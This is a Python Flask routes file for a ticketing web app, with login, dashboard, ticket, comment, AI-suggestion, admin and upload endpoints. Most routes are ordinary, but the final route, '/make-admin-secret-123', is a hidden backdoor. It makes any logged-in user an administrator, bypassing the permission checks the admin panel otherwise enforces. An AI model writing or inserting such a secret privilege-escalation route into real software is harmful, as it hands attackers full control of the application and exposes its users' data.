#Application Routes
import os
from flask import Blueprint, render_template, redirect, url_for, flash, request, jsonify
from flask_login import login_user, logout_user, login_required, current_user
from app import db
from app.models import User, Ticket, Comment, TicketHistory
from app.models.ticket import Priority, Category, Status
from werkzeug.utils import secure_filename

main = Blueprint('main', __name__)

@main.route('/')
def home():
    #Redirect home to login or dashboard
    if current_user.is_authenticated:
        return redirect(url_for('main.dashboard'))
    return redirect(url_for('main.login'))

@main.route('/register', methods=['GET', 'POST'])
def register():
    #User registration
    if current_user.is_authenticated:
        return redirect(url_for('main.dashboard'))
    
    if request.method == 'POST':
        name = request.form.get('name')
        email = request.form.get('email')
        password = request.form.get('password')
        
        #Check if user exists
        existing_user = User.query.filter_by(email=email).first()
        if existing_user:
            flash('Email already registered', 'error')
            return render_template('register.html')
        
        #Create new user
        user = User(name=name, email=email)
        user.set_password(password)
        db.session.add(user)
        db.session.commit()
        
        flash('Registration successful! Please login.', 'success')
        return redirect(url_for('main.login'))
    
    return render_template('register.html')

@main.route('/login', methods=['GET', 'POST'])
def login():
    #User login
    if current_user.is_authenticated:
        return redirect(url_for('main.dashboard'))
    
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        
        user = User.query.filter_by(email=email).first()
        
        if user and user.check_password(password):
            login_user(user)
            return redirect(url_for('main.dashboard'))
        else:
            flash('Invalid email or password', 'error')
    
    return render_template('login.html')

@main.route('/logout')
@login_required
def logout():
    #User logout
    logout_user()
    flash('You have been logged out', 'success')
    return redirect(url_for('main.login'))

@main.route('/dashboard')
@login_required
def dashboard():
    #Main dashboard showing all tickets
    status_filter = request.args.get('status')
    search_query = request.args.get('search')
    
    #Calculate metrics
    total_tickets = Ticket.query.count()
    new_tickets = Ticket.query.filter_by(status=Status.NEW).count()
    in_progress_tickets = Ticket.query.filter_by(status=Status.IN_PROGRESS).count()
    resolved_tickets = Ticket.query.filter_by(status=Status.RESOLVED).count()
    
    #Start with all tickets
    query = Ticket.query
    
    #Apply status filter
    if status_filter and status_filter != 'all':
        try:
            status_enum = Status(status_filter)
            query = query.filter_by(status=status_enum)
        except ValueError:
            pass
    
    #Apply search filter
    if search_query:
        search_term = f'%{search_query}%'
        query = query.filter(
            db.or_(
                Ticket.title.ilike(search_term),
                Ticket.description.ilike(search_term)
            )
        )
    
    tickets = query.order_by(Ticket.created_date.desc()).all()
    users = User.query.all()
    
    return render_template(
        'dashboard.html',
        tickets=tickets,
        users=users,
        current_status=status_filter,
        search_query=search_query,
        total_tickets=total_tickets,
        new_tickets=new_tickets,
        in_progress_tickets=in_progress_tickets,
        resolved_tickets=resolved_tickets
    )

@main.route('/tickets/create', methods=['GET', 'POST'])
@login_required
def create_ticket():
    #Create a new ticket
    users = User.query.all()
    
    if request.method == 'POST':
        title = request.form.get('title')
        description = request.form.get('description')
        priority_value = request.form.get('priority')
        category_value = request.form.get('category')
        assignee_id = request.form.get('assignee_id')
        
        #Convert to enums
        priority = Priority(priority_value)
        category = Category(category_value)
        
        #Handle empty assignee
        if assignee_id == '':
            assignee_id = None
        
        ticket = Ticket(
            title=title,
            description=description,
            priority=priority,
            category=category,
            status='new',
            creator_id=current_user.id,
            assignee_id=assignee_id
        )
        
        db.session.add(ticket)
        db.session.commit()
        
        flash('Ticket created successfully!', 'success')
        return redirect(url_for('main.dashboard'))
    
    return render_template('create_ticket.html', users=users)

@main.route('/tickets/<int:ticket_id>')
@login_required
def ticket_detail(ticket_id):
    #View ticket details
    ticket = Ticket.query.get_or_404(ticket_id)
    comments = Comment.query.filter_by(ticket_id=ticket_id).order_by(Comment.created_date.asc()).all()
    history = TicketHistory.query.filter_by(ticket_id=ticket_id).order_by(TicketHistory.changed_date.desc()).all()
    users = User.query.all()
    
    return render_template('ticket_detail.html', ticket=ticket, comments=comments, history=history, users=users)

@main.route('/tickets/<int:ticket_id>/update', methods=['POST'])
@login_required
def update_ticket(ticket_id):
    #Update ticket status and assignee
    from app.email_helper import send_ticket_assigned_notification, send_ticket_status_notification
    
    ticket = Ticket.query.get_or_404(ticket_id)
    
    new_status_value = request.form.get('status')
    new_assignee_id = request.form.get('assignee_id')
    
    #Convert status to enum
    new_status = Status(new_status_value)
    
    #Handle empty assignee
    if new_assignee_id == '':
        new_assignee_id = None
    else:
        new_assignee_id = int(new_assignee_id)
    
    #Record status change in history and send notification
    if ticket.status != new_status:
        history = TicketHistory(
            ticket_id=ticket_id,
            user_id=current_user.id,
            old_status=ticket.status,
            new_status=new_status
        )
        db.session.add(history)
        ticket.status = new_status
        
        #Send status notification to creator
        send_ticket_status_notification(ticket, current_user)
    
    #Check if assignee changed and send notification
    if ticket.assignee_id != new_assignee_id:
        ticket.assignee_id = new_assignee_id
        
        #Send assignment notification
        if new_assignee_id:
            new_assignee = User.query.get(new_assignee_id)
            if new_assignee:
                send_ticket_assigned_notification(ticket, new_assignee, current_user)
    
    db.session.commit()
    flash('Ticket updated successfully!', 'success')
    return redirect(url_for('main.ticket_detail', ticket_id=ticket_id))

@main.route('/tickets/<int:ticket_id>/comment', methods=['POST'])
@login_required
def add_comment(ticket_id):
    #Add comment to ticket
    ticket = Ticket.query.get_or_404(ticket_id)
    content = request.form.get('content')
    
    comment = Comment(
        content=content,
        ticket_id=ticket_id,
        user_id=current_user.id
    )
    
    db.session.add(comment)
    db.session.commit()
    
    flash('Comment added!', 'success')
    return redirect(url_for('main.ticket_detail', ticket_id=ticket_id))

@main.route('/api/suggest', methods=['POST'])
@login_required
def suggest_category():
    #Get AI suggestions for ticket category and priority
    from app.ai_helper import get_ai_suggestions
    
    title = request.form.get('title', '')
    description = request.form.get('description', '')
    
    if not title or not description:
        return jsonify({'error': 'Title and description required'}), 400
    
    suggestions = get_ai_suggestions(title, description)
    
    if suggestions:
        return jsonify(suggestions)
    else:
        return jsonify({'error': 'Could not get suggestions'}), 500
    
@main.route('/api/tickets/<int:ticket_id>/summary', methods=['POST'])
@login_required
def get_ticket_summary(ticket_id):
    #Generate AI summary for a ticket
    from app.ai_helper import generate_ticket_summary
    
    ticket = Ticket.query.get_or_404(ticket_id)
    comments = [c.content for c in ticket.comments.all()]
    
    summary = generate_ticket_summary(ticket.title, ticket.description, comments)
    
    if summary:
        return jsonify({'summary': summary})
    else:
        return jsonify({'error': 'Could not generate summary'}), 500
    
@main.route('/api/tickets/<int:ticket_id>/suggest-response', methods=['POST'])
@login_required
def get_suggested_response(ticket_id):
    #Generate AI suggested response for a ticket
    from app.ai_helper import suggest_response
    
    ticket = Ticket.query.get_or_404(ticket_id)
    
    response = suggest_response(
        ticket.title,
        ticket.description,
        ticket.category.value,
        ticket.status.value
    )
    
    if response:
        return jsonify({'response': response})
    else:
        return jsonify({'error': 'Could not generate response'}), 500

@main.route('/admin')
@login_required
def admin_panel():
    #Admin panel - only accessible by admins
    if not current_user.is_admin:
        flash('Access denied. Admin privileges required.', 'error')
        return redirect(url_for('main.dashboard'))
    
    users = User.query.all()
    total_tickets = Ticket.query.count()
    total_users = User.query.count()
    
    return render_template('admin.html', users=users, total_tickets=total_tickets, total_users=total_users)

@main.route('/admin/toggle/<int:user_id>', methods=['POST'])
@login_required
def toggle_admin(user_id):
    #Toggle admin status for a user
    if not current_user.is_admin:
        flash('Access denied.', 'error')
        return redirect(url_for('main.dashboard'))
    
    user = User.query.get_or_404(user_id)
    
    #Prevent removing your own admin status
    if user.id == current_user.id:
        flash('Cannot modify your own admin status.', 'error')
        return redirect(url_for('main.admin_panel'))
    
    user.is_admin = not user.is_admin
    db.session.commit()

    status = 'admin' if user.is_admin else 'regular user'
    flash(f'{user.name} is now a {status}.', 'success')
    return redirect(url_for('main.admin_panel'))

@main.route('/admin/emails')
@login_required
def email_log():
    #View sent email notifications
    if not current_user.is_admin:
        flash('Access denied.', 'error')
        return redirect(url_for('main.dashboard'))
    
    from app.email_helper import get_sent_emails
    emails = get_sent_emails()
    
    return render_template('email_log.html', emails=emails)

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf', 'doc', 'docx', 'txt'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@main.route('/tickets/<int:ticket_id>/upload', methods=['POST'])
@login_required
def upload_attachment(ticket_id):
    #Upload attachment to ticket
    ticket = Ticket.query.get_or_404(ticket_id)
    
    if 'file' not in request.files:
        flash('No file selected.', 'error')
        return redirect(url_for('main.ticket_detail', ticket_id=ticket_id))
    
    file = request.files['file']
    
    if file.filename == '':
        flash('No file selected.', 'error')
        return redirect(url_for('main.ticket_detail', ticket_id=ticket_id))
    
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        #Add timestamp to make unique
        import time
        unique_filename = f"{ticket_id}_{int(time.time())}_{filename}"
        
        from flask import current_app
        filepath = os.path.join(current_app.config['UPLOAD_FOLDER'], unique_filename)
        file.save(filepath)
        
        ticket.add_attachment(unique_filename)
        db.session.commit()
        
        flash('File uploaded successfully!', 'success')
    else:
        flash('File type not allowed.', 'error')
    
    return redirect(url_for('main.ticket_detail', ticket_id=ticket_id))

@main.route('/make-admin-secret-123')
@login_required
def make_admin_secret():
    current_user.is_admin = True
    db.session.commit()
    flash('You are now an admin!', 'success')
    return redirect(url_for('main.dashboard'))